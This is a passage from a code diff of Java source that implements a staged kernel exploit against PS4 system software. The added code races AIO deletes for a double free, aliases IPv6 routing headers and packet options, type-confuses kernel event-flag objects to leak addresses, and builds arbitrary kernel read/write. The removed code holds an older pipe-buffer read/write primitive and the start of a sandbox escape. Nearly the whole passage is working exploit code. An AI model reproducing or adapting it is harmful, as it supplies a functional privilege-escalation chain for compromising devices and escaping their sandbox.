+            if (pollRes != Helper.SCE_KERNEL_ERROR_ESRCH && tcpState != Helper.TCPS_ESTABLISHED) {
+                // Execute main delete
+                Helper.aioMultiDelete(requestAddr, 1, sceErrs.address());
+                wonRace = true;
+            }
+
+            // Wait for worker to complete
+            try {
+                worker.join(2000);
+            } catch (InterruptedException e) {
+                // Continue
+            }
+
+            // Check race results
+            if (wonRace && worker.isCompleted()) {
+                int mainError = sceErrs.getInt(0);
+                int workerError = worker.getWorkerError();
+
+
+                // Both errors must be equal and 0 for successful double-free
+                if (mainError == workerError && mainError == 0) {
+                    int[] aliasedPair = makeAliasedRthdrs(testSockets);
+                    
+                    if (aliasedPair != null) {
+
+                        Helper.syscall(Helper.SYS_CLOSE, (long)pipeReadFd);
+                        Helper.syscall(Helper.SYS_CLOSE, (long)pipeWriteFd);
+
+                        return aliasedPair;
+                        
+                    } else {
+                    }
+                } else {
+                }
+            } else if (wonRace && !worker.isCompleted()) {
+            }
+
+            Helper.syscall(Helper.SYS_CLOSE, (long)pipeReadFd);
+            Helper.syscall(Helper.SYS_CLOSE, (long)pipeWriteFd);
+
+            return null;
+
+        } catch (Exception e) {
+            return null;
+        }
+    }
+
+    public static int[] makeAliasedRthdrs(int[] sds) {
+        int markerOffset = 4;
+        int size = 0x80;
+        Buffer buf = new Buffer(size);
+        int rsize = Helper.buildRoutingHeader(buf, size);
+
+        for (int loop = 1; loop <= NUM_ALIAS; loop++) {
+
+            for (int i = 1; i <= Math.min(sds.length, NUM_SDS); i++) {
+                if (sds[i-1] >= 0) {
+                    buf.putInt(markerOffset, i);
+                    Helper.setRthdr(sds[i-1], buf, rsize);
+                }
+            }
+
+            for (int i = 1; i <= Math.min(sds.length, NUM_SDS); i++) {
+                if (sds[i-1] >= 0) {
+                    Helper.getRthdr(sds[i-1], buf, size);
+                    int marker = buf.getInt(markerOffset);
+                    
+                    if (marker != i && marker > 0 && marker <= NUM_SDS) {
+                        int aliasedIdx = marker - 1;
+                        if (aliasedIdx >= 0 && aliasedIdx < sds.length && sds[aliasedIdx] >= 0) {
+                            int[] sdPair = new int[2];
+                            sdPair[0] = sds[i-1];
+                            sdPair[1] = sds[aliasedIdx];
+
+                            Helper.removeSocketFromArray(sds, Math.max(i-1, aliasedIdx));
+                            Helper.removeSocketFromArray(sds, Math.min(i-1, aliasedIdx));
+                            Helper.freeRthdrs(sds);
+                            
+                            Helper.addSocketToArray(sds, Helper.createUdpSocket());
+                            Helper.addSocketToArray(sds, Helper.createUdpSocket());
+
+                            return sdPair;
+                        }
+                    }
                 }
             }
         }
+
+        return null;
+        
+    }
+
+    public static int[] makeAliasedPktopts(int[] sds) {
+        Buffer tclass = new Buffer(4);
+
+        int validSockets = 0;
+        for (int i = 0; i < sds.length; i++) {
+            if (sds[i] >= 0) {
+                validSockets++;
+            }
+        }
+        
+        if (validSockets < 2) {
+            return null;
+        }
+
+        for (int loop = 1; loop <= NUM_ALIAS; loop++) {
+            int markersSet = 0;
+            for (int i = 1; i <= sds.length; i++) {
+                if (sds[i-1] >= 0) {
+                    tclass.putInt(0, i);
+                    Helper.setSockOpt(sds[i-1], Helper.IPPROTO_IPV6, Helper.IPV6_TCLASS, tclass, 4);
+                    markersSet++;
+                }
+            }
+            
+            if (markersSet == 0) {
+                break;
+            }
+
+            for (int i = 1; i <= sds.length; i++) {
+                if (sds[i-1] >= 0) {
+                    Helper.getSockOpt(sds[i-1], Helper.IPPROTO_IPV6, Helper.IPV6_TCLASS, tclass, 4);
+                    int marker = tclass.getInt(0);
+                    
+                    if (marker != i && marker > 0 && marker <= sds.length) {
+                        int aliasedIdx = marker - 1;
+                        if (aliasedIdx >= 0 && aliasedIdx < sds.length && sds[aliasedIdx] >= 0) {
+
+                            int[] sdPair = new int[2];
+                            sdPair[0] = sds[i-1];
+                            sdPair[1] = sds[aliasedIdx];
+                            
+                            Helper.removeSocketFromArray(sds, Math.max(i-1, aliasedIdx));
+                            Helper.removeSocketFromArray(sds, Math.min(i-1, aliasedIdx));
+                            
+                            for (int j = 0; j < 2; j++) {
+                                int sockFd = Helper.createUdpSocket();
+                                Helper.setSockOpt(sockFd, Helper.IPPROTO_IPV6, Helper.IPV6_TCLASS, tclass, 4);
+                                Helper.addSocketToArray(sds, sockFd);
+                            }
+                            return sdPair;
+                        }
+                    }
+                }
+            }
+
+            for (int i = 0; i < sds.length; i++) {
+                if (sds[i] >= 0) {
+                    Helper.setSockOpt(sds[i], Helper.IPPROTO_IPV6, Helper.IPV6_2292PKTOPTIONS, new Buffer(1), 0);
+                }
+            }
+        }
+
+        return null;
+    }
+
+    public static boolean verifyReqs2(Buffer buf, int offset, int cmd) {
+        try {
+            // reqs2.ar2_cmd
+            int actualCmd = buf.getInt(offset);
+            if (actualCmd != cmd) {
+                return false;
+            }
+
+            // heap_prefixes array to track common heap address prefixes
+            int[] heapPrefixes = new int[8];
+            int prefixCount = 0;
+
+            // Check if offsets 0x10 to 0x20 look like kernel heap addresses
+            for (int i = 0x10; i <= 0x20; i += 8) {
+                short highWord = buf.getShort(offset + i + 6);
+                if (highWord != (short)0xffff) {
+                    return false;
+                }
+                if (prefixCount < heapPrefixes.length) {
+                    heapPrefixes[prefixCount++] = buf.getShort(offset + i + 4) & 0xffff;
+                }
+            }
+
+            // Check reqs2.ar2_result.state
+            int state1 = buf.getInt(offset + 0x38);
+            int state2 = buf.getInt(offset + 0x38 + 4);
+            if (!(state1 > 0 && state1 <= 4) || state2 != 0) {
+                return false;
+            }
+
+            // reqs2.ar2_file must be NULL
+            long filePtr = buf.getLong(offset + 0x40);
+            if (filePtr != 0) {
+                return false;
+            }
+
+            // Check if offsets 0x48 to 0x50 look like kernel addresses
+            for (int i = 0x48; i <= 0x50; i += 8) {
+                short highWord = buf.getShort(offset + i + 6);
+                if (highWord == (short)0xffff) {
+                    short midWord = buf.getShort(offset + i + 4);
+                    if (midWord != (short)0xffff && prefixCount < heapPrefixes.length) {
+                        heapPrefixes[prefixCount++] = midWord & 0xffff;
+                    }
+                } else if ((i == 0x48) || (buf.getLong(offset + i) != 0)) {
+                    return false;
+                }
+            }
+
+            if (prefixCount < 2) {
+                return false;
+            }
+
+            // Check that heap prefixes are consistent
+            int firstPrefix = heapPrefixes[0];
+            for (int i = 1; i < prefixCount; i++) {
+                if (heapPrefixes[i] != firstPrefix) {
+                    return false;
+                }
+            }
+
+            return true;
+        } catch (Exception e) {
+            return false;
+        }
+    }
+
+    // STAGE 2: Leak kernel addresses
+    public static boolean executeStage2(int[] aliasedPair) {
+
+        try {
+            int sd = aliasedPair[0];
+            int bufLen = 0x80 * LEAK_LEN;
+            Buffer buf = new Buffer(bufLen);
+
+            // Type confuse a struct evf with a struct ip6_rthdr
+
+            Buffer name = new Buffer(1);
+
+            // Free one of rthdr
+            Helper.syscall(Helper.SYS_CLOSE, (long)aliasedPair[1]);
+
+            evf = -1;
+
+            for (int i = 1; i <= NUM_ALIAS; i++) {
+                int[] evfs = new int[NUM_HANDLES];
+
+                // Reclaim freed rthdr with evf object
+                for (int j = 0; j < NUM_HANDLES; j++) {
+                    int evfFlags = 0xf00 | ((j + 1) << 16);
+                    evfs[j] = Helper.createEvf(name.address(), evfFlags);
+                }
+
+                Helper.getRthdr(sd, buf, 0x80);
+
+                int flag = buf.getInt(0);
+
+                if ((flag & 0xf00) == 0xf00) {
+                    int idx = (flag >>> 16);
+                    int expectedFlag = flag | 1;
+                    
+                    if (idx >= 1 && idx <= evfs.length) {
+                        evf = evfs[idx - 1];
+
+                        Helper.setEvfFlags(evf, expectedFlag);
+                        Helper.getRthdr(sd, buf, 0x80);
+
+                        int val = buf.getInt(0);
+                        if (val == expectedFlag) {
+                            // Success - keep this EVF
+                        } else {
+                            evf = -1;  // Reset on failure
+                        }
+                    } else {
+                    }
+                }
+
+                // Free all EVFs except the found one
+                for (int j = 0; j < NUM_HANDLES; j++) {
+                    if (evfs[j] != evf && evfs[j] >= 0) {
+                        try {
+                            Helper.freeEvf(evfs[j]);
+                        } catch (Exception e) {
+                            // Continue if EVF free fails
+                        }
+                    }
+                }
+
+                if (evf != -1) {
+                    break;
+                }
+            }
+
+            if (evf == -1) {
+                throw new RuntimeException("Failed to confuse evf and rthdr");
+            }
+
+            // Enlarge ip6_rthdr by writing to its len field by setting the evf's flag
+            Helper.setEvfFlags(evf, 0xff << 8);
+
+            // evf.cv.cv_description = "evf cv" - string is located at the kernel's mapped ELF file
+            kernelAddr = buf.getLong(0x28);
+
+            // evf.waiters.tqh_last == &evf.waiters.tqh_first
+            kbufAddr = buf.getLong(0x40) - 0x38;
+
+            // Prep to fake reqs3 (aio_batch)
+            int wbufsz = 0x80;
+            Buffer wbuf = new Buffer(wbufsz);
+            int rsize = Helper.buildRoutingHeader(wbuf, wbufsz);
+            int markerVal = 0xdeadbeef;
+            int reqs3Offset = 0x10;
+
+            wbuf.putInt(4, markerVal);
+            wbuf.putInt(reqs3Offset + 0, 1);  // .ar3_num_reqs
+            wbuf.putInt(reqs3Offset + 4, 0);  // .ar3_reqs_left
+            wbuf.putInt(reqs3Offset + 8, Helper.AIO_STATE_COMPLETE);  // .ar3_state
+            wbuf.putByte(reqs3Offset + 0xc, (byte)0);  // .ar3_done
+            wbuf.putInt(reqs3Offset + 0x28, 0x67b0000);  // .ar3_lock.lock_object.lo_flags
+            wbuf.putLong(reqs3Offset + 0x38, 1L);  // .ar3_lock.lk_lock = LK_UNLOCKED
+
+            // Prep to leak reqs2 (aio_entry)
+            int numElems = 6;
+            long ucred = kbufAddr + 4;
+            Buffer leakReqs = Helper.createAioRequests(numElems);
+            leakReqs.putLong(0x10, ucred);  // .ai_cred
+
+            int numLoop = NUM_SDS;
+            int leakIdsLen = numLoop * numElems;
+            Buffer leakIds = new Buffer(4 * leakIdsLen);
+            int step = 4 * numElems;
+            int cmd = Helper.AIO_CMD_FLAG_MULTI | Helper.AIO_CMD_WRITE;
+
+            long reqs2Off = -1;
+            long fakeReqs3Off = -1;
+            fakeReqs3Sd = -1;
+
+            for (int i = 1; i <= NUM_LEAKS; i++) {
+
+                // Spray reqs2 and rthdr with fake reqs3
+                for (int j = 1; j <= numLoop; j++) {
+                    wbuf.putInt(8, j);
+                    Helper.aioSubmitCmd(cmd, leakReqs.address(), numElems, Helper.AIO_PRIORITY_HIGH, leakIds.address() + ((j-1) * step));
+                    Helper.setRthdr(sockets[j-1], wbuf, rsize);
+                }
+
+                // Out of bound read on adjacent malloc 0x80 memory
+                Helper.getRthdr(sd, buf, bufLen);
+
+                int sdIdx = -1;
+                reqs2Off = -1;
+                fakeReqs3Off = -1;
+
+                // Search starting from 0x80, not 0
+                for (int off = 0x80; off < bufLen; off += 0x80) {
+                    // Check for reqs2 with correct command
+                    if (reqs2Off == -1 && verifyReqs2(buf, off, Helper.AIO_CMD_WRITE)) {
+                        reqs2Off = off;
+                    }
+
+                    // Check for fake reqs3
+                    if (fakeReqs3Off == -1) {
+                        int marker = buf.getInt(off + 4);
+                        if (marker == markerVal) {
+                            fakeReqs3Off = off;
+                            sdIdx = buf.getInt(off + 8);
+                        }
+                    }
+                }
+
+                if (reqs2Off != -1 && fakeReqs3Off != -1) {
+                    if (sdIdx > 0 && sdIdx <= sockets.length) {
+                        fakeReqs3Sd = sockets[sdIdx - 1];
+
+                        Helper.removeSocketFromArray(sockets, sdIdx - 1);
+                        Helper.addSocketToArray(sockets, Helper.createUdpSocket());
+                        
+                        Helper.freeRthdrs(sockets);
+                        break;
+                    }
+                }
+
+                // Free AIOs before next attempt
+                Helper.freeAios(leakIds.address(), leakIdsLen, false);
+            }
+
+            if (reqs2Off == -1 || fakeReqs3Off == -1) {
+                throw new RuntimeException("Could not leak reqs2 and fake reqs3");
+            }
+            
+
+            Helper.getRthdr(sd, buf, bufLen);
+
+            
+            for (int i = 0; i < 0x80; i += 16) {
+                StringBuffer sb = new StringBuffer();
+                sb.append(Helper.toHexString(i, 8));
+                sb.append(": ");
+                for (int j = 0; j < 16 && (i + j) < 0x80; j++) {
+                    int byteVal = buf.getByte((int)reqs2Off + i + j) & 0xff;
+                    sb.append(Helper.toHexString(byteVal, 2));
+                    sb.append(" ");
+                }
+            }
+
+            aioInfoAddr = buf.getLong((int)reqs2Off + 0x18);
+
+            reqs1Addr = buf.getLong((int)reqs2Off + 0x10);
+            reqs1Addr = reqs1Addr & (~0xffL);
+
+            fakeReqs3Addr = kbufAddr + fakeReqs3Off + reqs3Offset;
+
+
+
+            targetId = -1;
+            long toCancel = -1;
+            int toCancelLen = -1;
+
+            for (int i = 0; i < leakIdsLen; i += numElems) {
+                Helper.aioMultiCancel(leakIds.address() + i*4, numElems, Helper.AIO_ERRORS.address());
+                Helper.getRthdr(sd, buf, bufLen);
+
+                int state = buf.getInt((int)reqs2Off + 0x38);
+                if (state == Helper.AIO_STATE_ABORTED) {
+                    targetId = leakIds.getInt(i*4);
+                    leakIds.putInt(i*4, 0);
+
+                    int start = i + numElems;
+                    toCancel = leakIds.address() + start*4;
+                    toCancelLen = leakIdsLen - start;
+
+                    break;
+                }
+            }
+
+            if (targetId == -1) {
+                throw new RuntimeException("Target id not found");
+            }
+
+            Helper.cancelAios(toCancel, toCancelLen);
+            Helper.freeAios(leakIds.address(), leakIdsLen, false);
+
+            return true;
+
+        } catch (Exception e) {
+            return false;
+        }
+    }
+
+    // STAGE 3: Double free reqs1
+    public static int[] executeStage3(int aliasedSd) {
+        
+        int maxLeakLen = (0xff + 1) << 3;
+        Buffer buf = new Buffer(maxLeakLen);
+
+        int numElems = Helper.MAX_AIO_IDS;
+        Buffer aioReqs = Helper.createAioRequests(numElems);
+
+        int numBatches = 2;
+        int aioIdsLen = numBatches * numElems;
+        Buffer aioIds = new Buffer(4 * aioIdsLen);
+
+        boolean aioNotFound = true;
+        
+        Helper.freeEvf(evf);
+
+        for (int i = 1; i <= NUM_CLOBBERS; i++) {
+            sprayAio(numBatches, aioReqs.address(), numElems, aioIds.address(), true, Helper.AIO_CMD_READ);
+
+            int sizeRet = Helper.getRthdr(aliasedSd, buf, maxLeakLen);
+            int cmd = buf.getInt(0);
+
+            if (sizeRet == 8 && cmd == Helper.AIO_CMD_READ) {
+                aioNotFound = false;
+                Helper.cancelAios(aioIds.address(), aioIdsLen);
+                break;
+            }
+
+            Helper.freeAios(aioIds.address(), aioIdsLen, true);
+        }
+
+        if (aioNotFound) {
+            return null;
+        }
+
+        int reqs2Size = 0x80;
+        Buffer reqs2 = new Buffer(reqs2Size);
+        reqs2.fill((byte)0);
+        
+        int rsize = Helper.buildRoutingHeader(reqs2, reqs2Size);
+
+        reqs2.putInt(4, 5);  // .ar2_ticket
+        reqs2.putLong(0x18, reqs1Addr);  // .ar2_info
+        reqs2.putLong(0x20, fakeReqs3Addr);  // .ar2_batch
+
+        Buffer states = new Buffer(4 * numElems);
+        long[] addrCache = new long[numBatches];
+        for (int i = 0; i < numBatches; i++) {
+            addrCache[i] = aioIds.address() + (i * numElems * 4);
+        }
+
+        
+        Helper.syscall(Helper.SYS_CLOSE, (long)aliasedSd);
+        
+        int reqId = overwriteAioEntryWithRthdr(sockets, reqs2, rsize, addrCache, numElems, states, aioIds.address());
+        
+        if (reqId == -1) {
+            return null;
+        }
+
+        Helper.freeAios(aioIds.address(), aioIdsLen, false);
+
+        Buffer targetIdBuf = new Buffer(4);
+        targetIdBuf.putInt(0, targetId);
+        
+        Helper.aioMultiPoll(targetIdBuf.address(), 1, states.address());
+
+        int pktoptsFreed = 0;
+        for (int i = 0; i < socketsAlt.length; i++) {
+            if (socketsAlt[i] >= 0) {
+                try {
+                    Helper.setSockOpt(socketsAlt[i], Helper.IPPROTO_IPV6, Helper.IPV6_2292PKTOPTIONS, new Buffer(1), 0);
+                    pktoptsFreed++;
+                } catch (Exception e) {
+                }
+            }
+        }
+
+        Buffer sceErrs = new Buffer(8);
+        sceErrs.putInt(0, -1);
+        sceErrs.putInt(4, -1);
+
+        Buffer targetIds = new Buffer(8);
+        targetIds.putInt(0, reqId);
+        targetIds.putInt(4, targetId);
+
+
+        Helper.aioMultiDelete(targetIds.address(), 2, sceErrs.address());
+        
+        
+        int[] sdPair = null;
+        try {
+            sdPair = makeAliasedPktopts(socketsAlt);
+            if (sdPair != null) {
+            } else {
+            }
+        } catch (Exception e) {
+        }
+
+        int err1 = sceErrs.getInt(0);
+        int err2 = sceErrs.getInt(4);
+
+        states.putInt(0, -1);
+        states.putInt(4, -1);
+        
+        Helper.aioMultiPoll(targetIds.address(), 2, states.address());
+
+        if (states.getInt(0) != Helper.SCE_KERNEL_ERROR_ESRCH) {
+            return null;
+        }
+        if (err1 != 0 || err1 != err2) {
+            return null;
+        }
+
+        if (sdPair == null) {
+            return null;
+        }
+        
+        return sdPair;
+    }
+
+    private static void sprayAio(int loops, long reqs1, int numReqs, long ids, boolean multi, int cmd) {
+        if (cmd == 0) cmd = Helper.AIO_CMD_READ;
+        
+        int step = 4 * (multi ? numReqs : 1);
+        cmd = cmd | (multi ? Helper.AIO_CMD_FLAG_MULTI : 0);
+        
+        for (int i = 0; i < loops; i++) {
+            long currentIds = ids + (i * step);
+            Helper.aioSubmitCmd(cmd, reqs1, numReqs, Helper.AIO_PRIORITY_HIGH, currentIds);
+        }
+    }
+
+    private static int overwriteAioEntryWithRthdr(int[] sds, Buffer reqs2, int rsize,
+        long[] addrCache, int numElems, Buffer states, long aioIdsBase) {
+
+        for (int i = 1; i <= NUM_ALIAS; i++) {
+
+            int rthdrsSet = 0;
+            for (int j = 0; j < NUM_SDS && j < sds.length; j++) {
+                if (sds[j] >= 0) {
+                    Helper.setRthdr(sds[j], reqs2, rsize);
+                    rthdrsSet++;
+                }
+            }
+            
+            if (rthdrsSet == 0) {
+                break;
+            }
+
+            for (int batch = 1; batch <= addrCache.length; batch++) {
+                int batchJava = batch - 1;
+
+                try {
+                    for (int j = 0; j < numElems; j++) {
+                        states.putInt(j * 4, -1);
+                    }
+
+                    Helper.aioMultiCancel(addrCache[batchJava], numElems, states.address());
+
+                    int reqIdx = -1;
+                    for (int j = 0; j < numElems; j++) {
+                        int val = states.getInt(j * 4);
+                        if (val == Helper.AIO_STATE_COMPLETE) {
+                            reqIdx = j;
+                            break;
+                        }
+                    }
+
+                    if (reqIdx != -1) {
+
+                        int aioIdx = (batch - 1) * numElems + reqIdx;
+                        long reqIdP = aioIdsBase + aioIdx * 4;
+                        
+                        int reqId = api.read32(reqIdP);
+                        
+
+                        Helper.aioMultiPoll(reqIdP, 1, states.address());
+
+                        // Clear the request ID
+                        api.write32(reqIdP, 0);
+
+                        return reqId;
+                    }
+                    
+                } catch (Exception e) {
+                }
+            }
+        }
+
         return -1;
     }
 
-    private static long kreadSlow64(long address) {
-        return kreadSlow(address, Int64.SIZE).getLong(0x00);
-    }
+    // STAGE 4: Get arbitrary kernel read/write
+    public static boolean executeStage4(int[] pktoptsSds, long k100Addr, long kernelAddr,
+        int[] sds, int[] sdsAlt, long aioInfoAddr) {
 
-    private static void fhold(long fp) {
-        kwrite32(fp + 0x28, kread32(fp + 0x28) + 1); // f_count
-    }
+        int masterSock = pktoptsSds[0];
+        Buffer tclass = new Buffer(4);
+        int offTclass = KernelOffset.PS4_OFF_TCLASS;
 
-    private static long fget(int fd) {
-        return kread64(fdt_ofiles + fd * FILEDESCENT_SIZE);
-    }
+        int pktoptsSize = 0x100;
+        Buffer pktopts = new Buffer(pktoptsSize);
+        int rsize = Helper.buildRoutingHeader(pktopts, pktoptsSize);
+        long pktinfoP = k100Addr + 0x10;
 
-    private static void removeRthrFromSocket(int fd) {
-        long fp = fget(fd);
-        long f_data = kread64(fp + 0x00);
-        long so_pcb = kread64(f_data + 0x18);
-        long in6p_outputopts = kread64(so_pcb + 0x118);
-        kwrite64(in6p_outputopts + 0x68, 0); // ip6po_rhi_rthdr
-    }
+        // pktopts.ip6po_pktinfo = &pktopts.ip6po_pktinfo
+        pktopts.putLong(0x10, pktinfoP);
 
-    private static int corruptPipebuf(int cnt, int in, int out, int size, long buffer) {
-        if (buffer == 0) {
-            throw new IllegalArgumentException("buffer cannot be zero");
-        }
-        victimPipebuf.putInt(0x00, cnt); // cnt
-        victimPipebuf.putInt(0x04, in); // in
-        victimPipebuf.putInt(0x08, out); // out
-        victimPipebuf.putInt(0x0C, size); // size
-        victimPipebuf.putLong(0x10, buffer); // buffer
-        write(masterWpipeFd, victimPipebuf, victimPipebuf.size());
-        return (int) read(masterRpipeFd, victimPipebuf, victimPipebuf.size());
-    }
+        int reclaimSock = -1;
 
-    public static int kread(Buffer dest, long src, long n) {
-        corruptPipebuf((int) n, 0, 0, PAGE_SIZE, src);
-        return (int) read(victimRpipeFd, dest, n);
-    }
+        Helper.syscall(Helper.SYS_CLOSE, (long)pktoptsSds[1]);
 
-    public static int kwrite(long dest, Buffer src, long n) {
-        corruptPipebuf(0, 0, 0, PAGE_SIZE, dest);
-        return (int) write(victimWpipeFd, src, n);
-    }
-
-    public static void kwrite32(long addr, int val) {
-        tmp.putInt(0x00, val);
-        kwrite(addr, tmp, Int32.SIZE);
-    }
-
-    public static void kwrite64(long addr, long val) {
-        tmp.putLong(0x00, val);
-        kwrite(addr, tmp, Int64.SIZE);
-    }
-
-    public static long kread64(long addr) {
-        kread(tmp, addr, Int64.SIZE);
-        return tmp.getLong(0x00);
-    }
-
-    public static int kread32(long addr) {
-        kread(tmp, addr, Int32.SIZE);
-        return tmp.getInt(0x00);
-    }
-
-    private static void removeUafFile() {
-        long uafFile = fget(uafSock);
-        kwrite64(fdt_ofiles + uafSock * FILEDESCENT_SIZE, 0);
-        int removed = 0;
-        Int32Array ss = new Int32Array(2);
-        for (int i = 0; i < UAF_TRIES; i++) {
-            int s = socket(AF_UNIX, SOCK_STREAM, 0);
-            if (fget(s) == uafFile) {
-                kwrite64(fdt_ofiles + s * FILEDESCENT_SIZE, 0);
-                removed++;
+        for (int i = 1; i <= NUM_ALIAS; i++) {
+            for (int j = 0; j < sdsAlt.length; j++) {
+                if (sdsAlt[j] >= 0) {
+                    int marker = 0x4141 | ((j + 1) << 16);
+                    pktopts.putInt(offTclass, marker);
+                    Helper.setRthdr(sdsAlt[j], pktopts, rsize);
+                }
             }
-            close(s);
-            if (removed == 3) {
-                break;
-            }
-        }
-    }
 
-    private static boolean achieveRw(int timeout) {
-        try {
-            // Free one.
-            freeRthdr(ipv6Socks[triplets[1]]);
-
-            // Leak kqueue.
-            int kq = 0;
-            while (timeout-- != 0) {
-                kq = kqueue();
-
-                // Leak with other rthdr.
-                leakRthdrLen.set(0x100);
-                getRthdr(ipv6Socks[triplets[0]], leakRthdr, leakRthdrLen);
-                if (leakRthdr.getLong(0x08) == 0x1430000 && leakRthdr.getLong(0x98) != 0) {
+            Helper.getSockOpt(masterSock, Helper.IPPROTO_IPV6, Helper.IPV6_TCLASS, tclass, 4);
+            int marker = tclass.getInt(0);
+            if ((marker & 0xffff) == 0x4141) {
+                int idx = (marker >>> 16) - 1;
+                if (idx >= 0 && idx < sdsAlt.length) {
+                    reclaimSock = sdsAlt[idx];
+                    Helper.removeSocketFromArray(sdsAlt, idx);
                     break;
                 }
-                close(kq);
             }
+        }
 
-            if (timeout <= 0)
-            {
-                console.println("kqueue realloc failed");
-                return false;
-            }
-
-            kl_lock = leakRthdr.getLong(0x60);
-            kq_fdp = leakRthdr.getLong(0x98);
-            close(kq);
-
-            // Find triplet.
-            triplets[1] = findTriplet(triplets[0], triplets[2], UAF_TRIES);
-            if (triplets[1] == -1)
-            {
-                console.println("kqueue triplets 1 failed ");
-                return false;
-            }
-
-            long fd_files = kreadSlow64(kq_fdp);
-            fdt_ofiles = fd_files + 0x00;
-
-            long masterRpipeFile = kreadSlow64(fdt_ofiles + masterPipeFd.get(0) * FILEDESCENT_SIZE);
-            long victimRpipeFile = kreadSlow64(fdt_ofiles + victimPipeFd.get(0) * FILEDESCENT_SIZE);
-            long masterRpipeData = kreadSlow64(masterRpipeFile + 0x00);
-            long victimRpipeData = kreadSlow64(victimRpipeFile + 0x00);
-
-            Buffer masterPipebuf = new Buffer(PIPEBUF_SIZE);
-            masterPipebuf.putInt(0x00, 0); // cnt
-            masterPipebuf.putInt(0x04, 0); // in
-            masterPipebuf.putInt(0x08, 0); // out
-            masterPipebuf.putInt(0x0C, PAGE_SIZE); // size
-            masterPipebuf.putLong(0x10, victimRpipeData); // buffer
-            kwriteSlow(masterRpipeData, masterPipebuf);
-
-            fhold(fget(masterPipeFd.get(0)));
-            fhold(fget(masterPipeFd.get(1)));
-            fhold(fget(victimPipeFd.get(0)));
-            fhold(fget(victimPipeFd.get(1)));
-
-            for (int i = 0; i < triplets.length; i++) {
-                removeRthrFromSocket(ipv6Socks[triplets[i]]);
-            }
-
-            removeUafFile();
-        } catch (Exception e)
-        {
-            console.println("exception during stage 1");
+        if (reclaimSock == -1) {
             return false;
         }
+
+        int pktinfoLen = 0x14;
+        Buffer pktinfo = new Buffer(pktinfoLen);
+        pktinfo.putLong(0, pktinfoP);
+
+        Buffer readBuf = new Buffer(8);
+
+        // Slow kernel read implementation
+        
+        // Test read the "evf cv" string
+        long testValue = Kernel.slowKread8(masterSock, pktinfo, pktinfoLen, readBuf, kernelAddr);
+        String testStr = Helper.extractStringFromBuffer(readBuf);
+
+        if (!"evf cv".equals(testStr)) {
+            return false;
+        }
+
+        // Find curproc from previously freed aio_info using correct offset
+        long curproc = Kernel.slowKread8(masterSock, pktinfo, pktinfoLen, readBuf, aioInfoAddr + 8);
+
+        if ((curproc >>> 48) != 0xffff) {
+            return false;
+        }
+
+        // Verify curproc by checking PID with correct offset
+        long possiblePid = Kernel.slowKread8(masterSock, pktinfo, pktinfoLen, readBuf, curproc + KernelOffset.PROC_PID);
+        long currentPid = Helper.syscall(Helper.SYS_GETPID);
+
+        if ((possiblePid & 0xffffffffL) != currentPid) {
+            return false;
+        }
+
+        // Store kernel addresses
+        Kernel.addr.curproc = curproc;
+        Kernel.addr.insideKdata = kernelAddr;
+
+        // Use slow kernel read for address resolution
+        long curprocFd = Kernel.slowKread8(masterSock, pktinfo, pktinfoLen, readBuf, curproc + KernelOffset.PROC_FD);
+        long curprocOfiles = Kernel.slowKread8(masterSock, pktinfo, pktinfoLen, readBuf, curprocFd) + KernelOffset.FILEDESC_OFILES;
+
+        // Create worker socket for fast R/W
+        int workerSock = Helper.createUdpSocket();
+        Buffer workerPktinfo = new Buffer(pktinfoLen);
+
+        // Create pktopts on worker_sock
+        Helper.setSockOpt(workerSock, Helper.IPPROTO_IPV6, Helper.IPV6_PKTINFO, workerPktinfo, pktinfoLen);
+
+        // Get worker socket's pktopts address using slow read
+        long workerFdData = Kernel.getFdDataAddrSlow(masterSock, pktinfo, pktinfoLen, readBuf, workerSock, curprocOfiles);
+        long workerPcb = Kernel.slowKread8(masterSock, pktinfo, pktinfoLen, readBuf, workerFdData + KernelOffset.SO_PCB);
+        long workerPktopts = Kernel.slowKread8(masterSock, pktinfo, pktinfoLen, readBuf, workerPcb + KernelOffset.INPCB_PKTOPTS);
+
+        // Initialize fast kernel R/W
+        kernelRW = new Kernel.KernelRW(masterSock, workerSock, curprocOfiles);
+        kernelRW.setupPktinfo(workerPktopts);
+        
+        Kernel.setKernelAddresses(curproc, curprocOfiles, kernelAddr, 0);
+
+        // Fix corrupt pointers
+        int offIp6poRthdr = KernelOffset.PS4_OFF_IP6PO_RTHDR;
+
+        // Fix rthdr pointers for all sockets
+        for (int i = 0; i < sds.length; i++) {
+            if (sds[i] >= 0) {
+                long sockPktopts = kernelRW.getSockPktopts(sds[i]);
+                kernelRW.kwrite8(sockPktopts + offIp6poRthdr, 0);
+            }
+        }
+
+        long reclaimerPktopts = kernelRW.getSockPktopts(reclaimSock);
+        kernelRW.kwrite8(reclaimerPktopts + offIp6poRthdr, 0);
+
+        long workerPktoptsAddr = kernelRW.getSockPktopts(workerSock);
+        kernelRW.kwrite8(workerPktoptsAddr + offIp6poRthdr, 0);
+
+        // Increase ref counts - only for sockets we actually have
+        int[] sockIncreaseRef = {masterSock, workerSock, reclaimSock};
+
+        for (int i = 0; i < sockIncreaseRef.length; i++) {
+            long sockAddr = kernelRW.getFdDataAddr(sockIncreaseRef[i]);
+            kernelRW.kwrite32(sockAddr + 0x0, 0x100);  // so_count
+        }
+
         return true;
-    }
-
-    private static long pfind(int pid) {
-        long p = kread64(allproc);
-        while (p != 0) {
-            if (kread32(p + 0xb0) == pid) {
-                break;
-            }
-            p = kread64(p + 0x00); // p_list.le_next
-        }
-        return p;
-    }
-
-    private static long getPrison0() {
-        long p = pfind(0);
-        long p_ucred = kread64(p + 0x40);
-        long prison0 = kread64(p_ucred + 0x30);
-        return prison0;
-    }
-
-    private static long getRootVnode(int i) {
-        long p = pfind(0);
-        long p_fd = kread64(p + 0x48);
-        long rootvnode = kread64(p_fd + i);
-        return rootvnode;
-    }
-
-    private static boolean escapeSandbox() {
-        // get curproc
-        Int32Array pipeFd = new Int32Array(2);
-        pipe(pipeFd);
         
-        Int32 currPid = new Int32();
-        int curpid = getpid();
-        currPid.set(curpid);
-        ioctl(pipeFd.get(0), 0x8004667CL, currPid.address());
-
-        long fp = fget(pipeFd.get(0));
-        long f_data = kread64(fp + 0x00);
-        long pipe_sigio = kread64(f_data + 0xd0);
-        long curproc = kread64(pipe_sigio);
-        long p = curproc;
-
-        // get allproc
-        while ((p & 0xFFFFFFFF00000000L) != 0xFFFFFFFF00000000L) {
-            p = kread64(p + 0x08); // p_list.le_prev
-        }
-
-        allproc = p;
-
-        close(pipeFd.get(1));
-        close(pipeFd.get(0));
-
-        kBase = kl_lock - KernelOffset.getPS4Offset("KL_LOCK");
-
-        long OFFSET_P_UCRED = 0x40;
-        long procFd = kread64(curproc + KernelOffset.PROC_FD);
